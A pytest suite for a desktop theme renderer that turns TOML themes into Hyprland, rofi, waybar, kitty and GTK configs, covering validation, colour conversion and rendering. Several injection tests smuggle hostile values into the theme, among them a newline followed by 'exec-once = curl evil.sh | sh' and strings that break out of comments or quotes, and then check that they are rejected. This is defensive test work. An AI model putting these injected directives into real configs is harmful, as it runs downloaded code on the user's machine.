"""Tests for scripts/render-theme.py — the single source of truth for colour.

The theme engine is the one place where a silent bug is expensive: a dropped role
does not crash the desktop, it repaints it wrong. So these tests pin the contract
(which roles exist, that a missing one fails loud) and the derivations that themes
rely on defaulting correctly.
"""
import pytest

from conftest import theme_ids, theme_paths


# ── The role contract ─────────────────────────────────────────────────────
def test_required_roles_are_unique(render_theme):
    roles = render_theme.REQUIRED_ROLES
    assert len(roles) == len(set(roles)), "a role is listed twice in REQUIRED_ROLES"


def test_aliases_derive_from_declared_roles(render_theme):
    """Every alias must point at a role themes are actually required to set."""
    for alias, source in render_theme.ALIASES.items():
        assert source in render_theme.REQUIRED_ROLES, (
            f"alias '{alias}' derives from '{source}', which no theme must declare"
        )


def test_validate_accepts_a_complete_theme(render_theme, minimal_theme):
    assert render_theme.validate(minimal_theme) == []


def test_validate_reports_every_missing_role(render_theme, minimal_theme):
    del minimal_theme["sem"]["accent"]
    del minimal_theme["sem"]["bg_dark"]
    assert sorted(render_theme.validate(minimal_theme)) == ["accent", "bg_dark"]


def test_validate_treats_an_empty_role_as_missing(render_theme, minimal_theme):
    """`accent = ""` is a typo, not a colour — it must not pass the contract."""
    minimal_theme["sem"]["accent"] = ""
    assert render_theme.validate(minimal_theme) == ["accent"]


# ── Value shapes: what keeps a theme data rather than code ────────────────
# The role contract says which keys exist; these say what a value may BE. The
# stakes are concrete: config/hypr/theme.conf is `source`d by hyprland.conf, so
# a colour that smuggles a newline appends real Hyprland directives.
def test_check_values_accepts_a_complete_theme(render_theme, minimal_theme):
    assert render_theme.check_values(minimal_theme) == []


def test_a_colour_carrying_a_newline_cannot_render(render_theme, minimal_theme):
    """The injection this gate exists for: `\\n` is a legal TOML escape, so
    tomllib hands us a real newline, and hyprland.conf sources what we write."""
    minimal_theme["sem"]["accent"] = "#000000\nexec-once = curl evil.sh | sh"
    problems = render_theme.check_values(minimal_theme)
    assert len(problems) == 1 and "sem.accent" in problems[0]


def test_an_error_message_stays_on_one_line(render_theme, minimal_theme):
    """A smuggled newline must not break the report it appears in."""
    minimal_theme["sem"]["accent"] = "#000000\nexec-once = x"
    assert "\n" not in render_theme.check_values(minimal_theme)[0]


@pytest.mark.parametrize("value", ["red", "#fff", "#12345", "#1234567", "#gggggg", 16711680])
def test_a_colour_must_be_rrggbb(render_theme, minimal_theme, value):
    minimal_theme["sem"]["accent"] = value
    assert render_theme.check_values(minimal_theme) != []


def test_a_missing_role_is_not_also_reported_as_malformed(render_theme, minimal_theme):
    """Absence is validate()'s to report — one typo, one complaint."""
    minimal_theme["sem"]["accent"] = ""
    assert render_theme.check_values(minimal_theme) == []
    assert render_theme.validate(minimal_theme) == ["accent"]


def test_a_font_family_may_not_smuggle_control_characters(render_theme, minimal_theme):
    minimal_theme["font"] = {"family": "Iosevka\nexec-once = x"}
    assert any("font.family" in p for p in render_theme.check_values(minimal_theme))


# A newline injects a Hyprland directive and is caught above; these are the OTHER
# escapes that matter once a value lands in a rofi .rasi / waybar .css, where a
# `/* */` block comment or a double-quoted value is the enclosing context. The
# name reaches every file's header comment; the family reaches quoted font values.
@pytest.mark.parametrize(
    "value",
    [
        "evil */ * { color: red } /*",   # closes then reopens a block comment
        "x /* nested",                    # opens one
        'quote " break',                  # ends a quoted value
        "semi ; colon",                   # a statement separator in rasi/CSS
        "brace { open",
        "brace } close",
        "back \\ slash",
    ],
)
def test_a_theme_name_cannot_break_out_of_a_comment_or_value(render_theme, minimal_theme, value):
    """`name` is interpolated into every generated file's header comment — a `/* */`
    block in the rasi/CSS ones — so a comment-closing sequence would turn the rest
    of the line into live config. The compositor's `#`-comments are safe (newline,
    already barred, is the only escape there); rofi and waybar are not."""
    minimal_theme["name"] = value
    assert any(p.startswith("name ") for p in render_theme.check_values(minimal_theme))


@pytest.mark.parametrize(
    "value",
    ['Iosevka " ; injected: x ; "', "Font */ x", "Font ; x", "Font { x }", "Back \\ slash"],
)
def test_a_font_family_cannot_break_out_of_a_quoted_value(render_theme, minimal_theme, value):
    """rofi/waybar render the family inside double quotes — `font: "<family> 11";` —
    so a `"` (or a rasi/CSS structural char) escapes into a live declaration."""
    minimal_theme["font"] = {"family": value}
    assert any("font.family" in p for p in render_theme.check_values(minimal_theme))


def test_ordinary_punctuation_in_name_and_family_still_passes(render_theme, minimal_theme):
    """The gate bars comment/quote breakers, not everyday characters — a display
    name and a real font family must survive it untouched."""
    minimal_theme["name"] = "Catppuccin Mocha (2026) — warm"
    minimal_theme["font"] = {"family": "JetBrainsMono Nerd Font"}
    assert render_theme.check_values(minimal_theme) == []


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("rounding", "10"),        # a string where a number belongs
        ("blur_size", True),       # bool is an int in Python — it must not read as 1
        ("bar_float", 1),          # ...and the reverse
        ("opacity", 1.4),          # alpha is 0..1
        ("opacity", -0.1),
        ("border_angle", 400),     # degrees
        ("border_inactive", "nope"),
        ("border_gradient", "#ffffff"),        # a bare colour, not a list
        ("border_gradient", []),               # nothing to render
        ("border_gradient", ["#ffffff", "x"]), # one bad stop spoils it
        ("bar_ws_indicator", "slide"),         # not a documented indicator
    ],
)
def test_a_malformed_param_is_rejected(render_theme, minimal_theme, key, value):
    minimal_theme["params"] = {key: value}
    assert any(f"params.{key}" in p for p in render_theme.check_values(minimal_theme))


def test_an_unknown_param_is_left_alone(render_theme, minimal_theme):
    """A theme written for a newer HWE must degrade, not explode: nothing reads
    the key, StrictUndefined never sees it, so it is simply not our business."""
    minimal_theme["params"] = {"bar_wobble": "yes"}
    assert render_theme.check_values(minimal_theme) == []


def test_the_private_palette_stays_free_form(render_theme, minimal_theme):
    """[palette] is the author's workbench — any shape, no template reads it."""
    minimal_theme["palette"] = {"mauve": "#cba6f7", "weight": 700, "note": "warm"}
    assert render_theme.check_values(minimal_theme) == []


def test_the_private_palette_still_cannot_smuggle_a_newline(render_theme, minimal_theme):
    """Free-form, but it does reach the render context — hold the safety line."""
    minimal_theme["palette"] = {"mauve": "#cba6f7\nexec-once = x"}
    assert any("palette.mauve" in p for p in render_theme.check_values(minimal_theme))


@pytest.mark.parametrize("theme_path", theme_paths(), ids=theme_ids())
def test_every_shipped_theme_has_well_shaped_values(render_theme, theme_path):
    theme = render_theme.load_theme(theme_path)
    assert render_theme.check_values(theme) == []


def test_load_theme_defaults_name_to_its_directory(render_theme, tmp_path):
    theme_dir = tmp_path / "unnamed"
    theme_dir.mkdir()
    toml = theme_dir / "theme.toml"
    toml.write_text('[sem]\naccent = "#ffffff"\n')
    theme = render_theme.load_theme(toml)
    assert theme["name"] == "unnamed"
    assert theme["params"] == {} and theme["font"] == {}


# ── Context building: the defaults themes lean on ─────────────────────────
def test_aliases_fill_in_from_raw_colours(render_theme, minimal_theme):
    minimal_theme["sem"]["green"] = "#00ff00"
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["sem"]["good"] == "#00ff00"


def test_an_explicit_alias_wins_over_the_derived_one(render_theme, minimal_theme):
    minimal_theme["sem"]["green"] = "#00ff00"
    minimal_theme["sem"]["good"] = "#abcdef"
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["sem"]["good"] == "#abcdef"


def test_lenient_substitutes_the_loud_placeholder(render_theme, minimal_theme):
    del minimal_theme["sem"]["accent"]
    ctx = render_theme.build_context(minimal_theme, lenient=True)
    assert ctx["sem"]["accent"] == render_theme.UGLY


def test_font_defaults_fill_the_keys_a_theme_omits(render_theme, minimal_theme):
    minimal_theme["font"] = {"bar": 14}
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["font"]["bar"] == 14
    assert ctx["font"]["terminal"] == render_theme.FONT_DEFAULTS["terminal"]
    assert ctx["font"]["family"] == render_theme.FONT_DEFAULTS["family"]


def test_an_unknown_font_key_warns_and_is_dropped(render_theme, minimal_theme, capsys):
    minimal_theme["font"] = {"termial": 9}  # typo for "terminal"
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert "termial" not in ctx["font"]
    assert "unknown [font] key" in capsys.readouterr().err


def test_params_font_stays_aliased_to_the_family(render_theme, minimal_theme):
    """Older templates read params.font; it must track [font].family."""
    minimal_theme["font"] = {"family": "Iosevka"}
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["params"]["font"] == "Iosevka"


def test_unfocused_opacity_is_derived_from_opacity(render_theme, minimal_theme):
    minimal_theme["params"] = {"opacity": 0.90}
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["params"]["opacity_unfocused"] == pytest.approx(0.86)
    # active/inactive default to the pair unless a theme pins them
    assert ctx["params"]["active_opacity"] == pytest.approx(0.90)
    assert ctx["params"]["inactive_opacity"] == pytest.approx(0.86)


def test_a_theme_may_pin_active_and_inactive_opacity(render_theme, minimal_theme):
    minimal_theme["params"] = {"opacity": 0.80, "active_opacity": 0.8, "inactive_opacity": 0.8}
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["params"]["active_opacity"] == pytest.approx(0.80)
    assert ctx["params"]["inactive_opacity"] == pytest.approx(0.80)


def test_border_gradient_defaults_to_the_accent_pair(render_theme, minimal_theme):
    minimal_theme["sem"]["accent"] = "#aaaaaa"
    minimal_theme["sem"]["accent_soft"] = "#bbbbbb"
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["params"]["border_gradient"] == ["#bbbbbb", "#aaaaaa"]


@pytest.mark.parametrize("indicator", ["glow", "underline", "pill", "dot"])
def test_every_documented_ws_indicator_is_accepted(render_theme, minimal_theme, indicator):
    minimal_theme["params"] = {"bar_ws_indicator": indicator}
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["params"]["bar_ws_indicator"] == indicator


def test_an_unknown_ws_indicator_fails_loud(render_theme, minimal_theme):
    minimal_theme["params"] = {"bar_ws_indicator": "slide"}
    with pytest.raises(SystemExit) as exc:
        render_theme.build_context(minimal_theme, lenient=False)
    assert "unknown bar_ws_indicator" in str(exc.value)


def test_transparent_is_always_available_to_templates(render_theme, minimal_theme):
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["sem"]["transparent"] == "#00000000"


# ── Colour filters — each config dialect spells a colour differently ──────
def test_noh_strips_the_hash(render_theme):
    assert render_theme._noh("#cba6f7") == "cba6f7"
    assert render_theme._noh("cba6f7") == "cba6f7"


def test_rgb_and_rgba_use_hyprland_syntax(render_theme):
    assert render_theme._rgb("#cba6f7") == "rgb(cba6f7)"
    assert render_theme._rgba("#cba6f7") == "rgba(cba6f7ff)"
    assert render_theme._rgba("#cba6f7", "80") == "rgba(cba6f780)"


def test_hexa_emits_css_rrggbbaa(render_theme):
    assert render_theme._hexa("#cba6f7", 1.0) == "#cba6f7ff"
    assert render_theme._hexa("#cba6f7", 0.0) == "#cba6f700"
    assert render_theme._hexa("#cba6f7", 0.5) == "#cba6f780"


def test_hexa_clamps_alpha_out_of_range(render_theme):
    assert render_theme._hexa("#000000", 2.5) == "#000000ff"
    assert render_theme._hexa("#000000", -1) == "#00000000"


def test_kcol_emits_kde_decimal_triples(render_theme):
    assert render_theme._kcol("#cba6f7") == "203,166,247"
    assert render_theme._kcol("#000000") == "0,0,0"
    assert render_theme._kcol("#ffffff") == "255,255,255"


def test_hexa_and_rgba_are_not_interchangeable(render_theme):
    """The two dialects look alike and get mixed up; keep them pinned apart."""
    assert render_theme._hexa("#cba6f7", 1.0) != render_theme._rgba("#cba6f7")


# ── Rendering ─────────────────────────────────────────────────────────────
def test_render_writes_every_template(render_theme, minimal_theme, templates_dir, tmp_path):
    written = render_theme.render_all(minimal_theme, templates_dir, tmp_path, lenient=False)
    expected = sorted(templates_dir.rglob("*.j2"))
    assert len(written) == len(expected)
    assert all(p.exists() for p in written)


def test_render_drops_the_j2_suffix_and_keeps_the_tree(
    render_theme, minimal_theme, templates_dir, tmp_path
):
    render_theme.render_all(minimal_theme, templates_dir, tmp_path, lenient=False)
    assert not list(tmp_path.rglob("*.j2")), "a rendered file kept its .j2 suffix"
    # templates/waybar/colors.css.j2 -> <out>/waybar/colors.css
    assert (tmp_path / "waybar" / "colors.css").exists()


def test_render_is_deterministic(render_theme, minimal_theme, templates_dir, tmp_path):
    """Same theme in, same bytes out — otherwise `theme apply` churns configs."""
    a, b = tmp_path / "a", tmp_path / "b"
    for out in (a, b):
        render_theme.render_all(minimal_theme, templates_dir, out, lenient=False)
    for left in sorted(a.rglob("*")):
        if left.is_file():
            right = b / left.relative_to(a)
            assert left.read_bytes() == right.read_bytes(), f"{left.name} differs between runs"


def test_a_template_typo_fails_loud_rather_than_rendering_empty(
    render_theme, minimal_theme, tmp_path
):
    """StrictUndefined is what stops a typo becoming a silent black screen."""
    from jinja2 import UndefinedError

    tmpl_dir = tmp_path / "templates"
    tmpl_dir.mkdir()
    (tmpl_dir / "broken.conf.j2").write_text("color = {{ sem.accnt }}\n")
    with pytest.raises(UndefinedError):
        render_theme.render_all(minimal_theme, tmpl_dir, tmp_path / "out", lenient=False)


# ── The gate: malformed values never reach a config file ──────────────────
def _evil_theme(render_theme, tmp_path):
    """A theme that is complete, and whose accent carries a Hyprland directive."""
    theme_dir = tmp_path / "evil"
    theme_dir.mkdir()
    roles = "\n".join(f'{r} = "#123456"' for r in render_theme.REQUIRED_ROLES if r != "accent")
    # \n below is a TOML escape: tomllib decodes it into a real newline.
    (theme_dir / "theme.toml").write_text(
        'name = "Evil"\n\n[sem]\n' + roles + '\naccent = "#000000\\nexec-once = touch /tmp/pwned"\n'
    )
    return theme_dir / "theme.toml"


def test_main_refuses_to_render_a_malformed_theme(render_theme, templates_dir, tmp_path, capsys):
    toml = _evil_theme(render_theme, tmp_path)
    out = tmp_path / "out"
    assert render_theme.main([str(toml), str(templates_dir), str(out)]) == 2
    assert not out.exists(), "a malformed theme reached the config tree"
    assert "sem.accent" in capsys.readouterr().err


def test_lenient_does_not_forgive_a_malformed_value(render_theme, templates_dir, tmp_path):
    """--lenient fills in what a theme FORGOT; it does not accept what a theme
    got wrong. Nothing about a smuggled directive is an omission."""
    toml = _evil_theme(render_theme, tmp_path)
    out = tmp_path / "out"
    assert render_theme.main([str(toml), str(templates_dir), str(out), "--lenient"]) == 2
    assert not out.exists()


def test_check_reports_a_malformed_theme(render_theme, tmp_path, capsys):
    """`hwe theme validate` runs --check: it must catch this, not just apply."""
    toml = _evil_theme(render_theme, tmp_path)
    assert render_theme.main([str(toml), "--check"]) == 2
    assert "sem.accent" in capsys.readouterr().err


# ── The shipped themes ────────────────────────────────────────────────────
def test_there_are_themes_to_test():
    """Guard the parametrised tests below from silently testing nothing."""
    assert theme_paths(), "no themes/*/theme.toml found"


@pytest.mark.parametrize("theme_path", theme_paths(), ids=theme_ids())
def test_every_shipped_theme_satisfies_the_contract(render_theme, theme_path):
    theme = render_theme.load_theme(theme_path)
    missing = render_theme.validate(theme)
    assert missing == [], f"{theme_path.parent.name} is missing roles: {', '.join(missing)}"


@pytest.mark.parametrize("theme_path", theme_paths(), ids=theme_ids())
def test_every_shipped_theme_declares_hex_colours(render_theme, theme_path):
    import re

    theme = render_theme.load_theme(theme_path)
    for role in render_theme.REQUIRED_ROLES:
        value = theme["sem"][role]
        assert re.fullmatch(r"#[0-9a-fA-F]{6}", value), (
            f"{theme_path.parent.name}: role '{role}' is '{value}', not #rrggbb"
        )


@pytest.mark.slow
@pytest.mark.parametrize("theme_path", theme_paths(), ids=theme_ids())
def test_every_shipped_theme_renders_the_whole_tree(
    render_theme, theme_path, templates_dir, tmp_path
):
    theme = render_theme.load_theme(theme_path)
    written = render_theme.render_all(theme, templates_dir, tmp_path, lenient=False)
    assert written
    # A complete theme must never fall back to the placeholder.
    for path in written:
        assert render_theme.UGLY not in path.read_text(), (
            f"{theme_path.parent.name}: {path.name} contains the {render_theme.UGLY} placeholder"
        )


@pytest.mark.parametrize("theme_path", theme_paths(), ids=theme_ids())
def test_every_shipped_theme_declares_the_full_font_block(render_theme, theme_path):
    """The contract permits omissions; the shipped themes document all of it."""
    theme = render_theme.load_theme(theme_path)
    assert set(theme["font"]) == set(render_theme.FONT_ROLES), (
        f"{theme_path.parent.name}: [font] should declare every key for discoverability"
    )


# ── New customization surface: on_accent, scheme, anim_speed, bar_opacity, ────
# theme names, ui_family. These pin the derivations and the template threading so
# a future refactor can't quietly drop a knob.
def _render(render_theme, theme, templates_dir, tmp_path):
    """Render a theme dict into tmp_path and hand the dir back for inspection."""
    render_theme.render_all(theme, templates_dir, tmp_path, lenient=False)
    return tmp_path


# on_accent — legible ink on an accent fill, derived unless pinned.
def test_on_accent_is_not_a_required_role(render_theme):
    """It auto-derives, so demanding it would break every existing theme."""
    assert "on_accent" not in render_theme.REQUIRED_ROLES


def test_on_accent_is_derived_from_the_role_extremes(render_theme, minimal_theme):
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    sem = ctx["sem"]
    assert sem["on_accent"] in (sem["bg_dark"], sem["fg_white"])


def test_on_accent_picks_the_higher_contrast_extreme(render_theme, minimal_theme):
    """A near-white accent must get the dark extreme as ink, not the light one —
    and this must hold whichever role happens to be the dark one (light themes)."""
    minimal_theme["sem"]["accent"] = "#ffffff"
    minimal_theme["sem"]["bg_dark"] = "#101010"     # the dark extreme
    minimal_theme["sem"]["fg_white"] = "#efefef"    # the light extreme
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["sem"]["on_accent"] == "#101010"


def test_a_theme_may_pin_on_accent(render_theme, minimal_theme):
    minimal_theme["sem"]["on_accent"] = "#abcdef"
    ctx = render_theme.build_context(minimal_theme, lenient=False)
    assert ctx["sem"]["on_accent"] == "#abcdef"


# scheme / prefer_dark — the light/dark switch.
def test_scheme_defaults_to_dark(render_theme, minimal_theme):
    p = render_theme.build_context(minimal_theme, lenient=False)["params"]
    assert p["scheme"] == "dark" and p["is_light"] is False and p["prefer_dark"] == 1


def test_a_light_theme_flips_prefer_dark(render_theme, minimal_theme):
    minimal_theme["params"]["scheme"] = "light"
    p = render_theme.build_context(minimal_theme, lenient=False)["params"]
    assert p["is_light"] is True and p["prefer_dark"] == 0


def test_an_unknown_scheme_is_rejected(render_theme, minimal_theme):
    minimal_theme["params"]["scheme"] = "sepia"
    assert any("scheme" in p for p in render_theme.check_values(minimal_theme))


def test_a_light_scheme_swaps_kitty_ansi_black(render_theme, minimal_theme, templates_dir, tmp_path):
    """ANSI black must be dark ink in a light theme, not the pale bg_light."""
    minimal_theme["params"]["scheme"] = "light"
    minimal_theme["sem"]["fg_normal"] = "#111111"
    minimal_theme["sem"]["bg_light"] = "#eeeeee"
    out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
    kitty = (out / "kitty" / "colors.conf").read_text()
    assert "color0 #111111" in kitty      # black = dark ink
    assert "color7 #eeeeee" in kitty      # white = pale surface


# anim_speed — the motion knob.
def test_anim_speed_defaults_to_the_base_durations(render_theme, minimal_theme):
    p = render_theme.build_context(minimal_theme, lenient=False)["params"]
    assert p["anim_speed"] == 1.0 and p["anim"]["windows"] == 5 and p["anim"]["fade"] == 6


def test_anim_speed_scales_durations_shorter(render_theme, minimal_theme):
    minimal_theme["params"]["anim_speed"] = 2
    anim = render_theme.build_context(minimal_theme, lenient=False)["params"]["anim"]
    assert anim["fade"] == 3 and anim["border"] == 4       # 6/2, 8/2


def test_anim_speed_never_drops_below_one_ds(render_theme, minimal_theme):
    minimal_theme["params"]["anim_speed"] = 100
    anim = render_theme.build_context(minimal_theme, lenient=False)["params"]["anim"]
    assert all(v >= 1 for v in anim.values())


def test_anim_speed_zero_means_no_animations(render_theme, minimal_theme, templates_dir, tmp_path):
    minimal_theme["params"]["anim_speed"] = 0
    assert render_theme.build_context(minimal_theme, lenient=False)["params"]["anim"] is None
    out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
    assert "enabled = 0" in (out / "hypr" / "theme.conf").read_text()


# bar_opacity — the bar backdrop, now themed rather than a style.css literal.
def test_bar_opacity_defaults_to_the_historic_value(render_theme, minimal_theme):
    assert render_theme.build_context(minimal_theme, lenient=False)["params"]["bar_opacity"] == 0.62


def test_bar_opacity_threads_into_the_bar_backdrop(render_theme, minimal_theme, templates_dir, tmp_path):
    minimal_theme["params"]["bar_opacity"] = 0.5
    out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
    assert "alpha(@bg_dark, 0.5)" in (out / "waybar" / "theme.css").read_text()


# Desktop theme names + the UI font family.
def test_theme_names_and_ui_family_thread_into_gtk(render_theme, minimal_theme, templates_dir, tmp_path):
    minimal_theme["params"].update(gtk_theme="Adw-Dark", icon_theme="Papirus")
    minimal_theme["font"]["ui_family"] = "Inter"
    ini = (_render(render_theme, minimal_theme, templates_dir, tmp_path) / "gtk-3.0" / "settings.ini").read_text()
    assert "gtk-theme-name=Adw-Dark" in ini
    assert "gtk-icon-theme-name=Papirus" in ini
    assert "gtk-font-name=Inter" in ini


def test_cursor_theme_line_is_omitted_when_unset(render_theme, minimal_theme, templates_dir, tmp_path):
    ini = (_render(render_theme, minimal_theme, templates_dir, tmp_path) / "gtk-3.0" / "settings.ini").read_text()
    assert "gtk-cursor-theme-name" not in ini


def test_cursor_theme_line_appears_when_set(render_theme, minimal_theme, templates_dir, tmp_path):
    minimal_theme["params"]["cursor_theme"] = "Bibata-Modern"
    ini = (_render(render_theme, minimal_theme, templates_dir, tmp_path) / "gtk-3.0" / "settings.ini").read_text()
    assert "gtk-cursor-theme-name=Bibata-Modern" in ini


def test_ui_family_is_a_family_not_a_size(render_theme, minimal_theme):
    """ui_family joins `family` as a STRING key; a number is a shape error."""
    minimal_theme["font"]["ui_family"] = 12
    assert any("ui_family" in p for p in render_theme.check_values(minimal_theme))


def test_a_theme_name_param_cannot_smuggle_structural_characters(render_theme, minimal_theme):
    minimal_theme["params"]["gtk_theme"] = 'Adwaita"; exec'
    assert any("gtk_theme" in p for p in render_theme.check_values(minimal_theme))


# ── The font fallback chain ───────────────────────────────────────────────
# A theme names the typeface it wants; nothing guarantees that typeface is
# packaged on the distribution you installed on. Every surface therefore renders
# a CHAIN — the theme's font, then a mono packaged everywhere, then the icon
# glyphs — so an absent family degrades to a good substitute with working icons
# instead of a screen full of tofu. These pin the chain to the templates.
def test_the_icon_and_fallback_families_are_part_of_the_contract(render_theme):
    for role in ("icon_family", "fallback_family"):
        assert role in render_theme.FONT_ROLES
        assert role in render_theme.FONT_FAMILY_KEYS, f"{role} is a family, not a size"


@pytest.mark.parametrize("role", ["icon_family", "fallback_family"])
def test_the_new_families_are_validated_like_the_text_font(render_theme, minimal_theme, role):
    """They reach the same quoted values `family` does, so the injection guard
    that closed the theme.conf hole has to cover them too."""
    minimal_theme["font"][role] = 'Iosevka"; exec-once = x'
    assert any(role in p for p in render_theme.check_values(minimal_theme))


def test_every_text_surface_renders_the_whole_chain(
    render_theme, minimal_theme, templates_dir, tmp_path
):
    """Bar, launcher, notifications and the lock screen all draw icons, so each
    must name the fallback AND the icon family — dropping either is how tofu
    gets shipped."""
    minimal_theme["font"] = {
        "family": "TestMono", "fallback_family": "FallbackMono", "icon_family": "IconGlyphs",
    }
    out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
    surfaces = [
        "waybar/theme.css", "mako/config", "rofi/theme.rasi",
        "rofi/powermenu.rasi", "rofi/keys.rasi", "hypr/hyprlock.conf",
    ]
    for rel in surfaces:
        text = (out / rel).read_text()
        assert "FallbackMono" in text, f"{rel} lost the fallback family"
        assert "IconGlyphs" in text, f"{rel} lost the icon family"


def test_kitty_maps_the_glyph_ranges_to_the_icon_font(
    render_theme, minimal_theme, templates_dir, tmp_path
):
    """kitty resolves glyphs per codepoint rather than by fontconfig ordering, so
    it gets explicit symbol_map ranges instead of a family list."""
    minimal_theme["font"] = {"family": "TestMono", "icon_family": "IconGlyphs"}
    out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
    conf = (out / "kitty/font.conf").read_text()
    assert "font_family      TestMono" in conf
    maps = [ln for ln in conf.splitlines() if ln.startswith("symbol_map")]
    assert maps, "kitty renders no symbol_map — icons would fall to fontconfig"
    assert all(ln.endswith("IconGlyphs") for ln in maps)
    assert any("U+E000" in ln for ln in maps), "the main Private Use Area is unmapped"
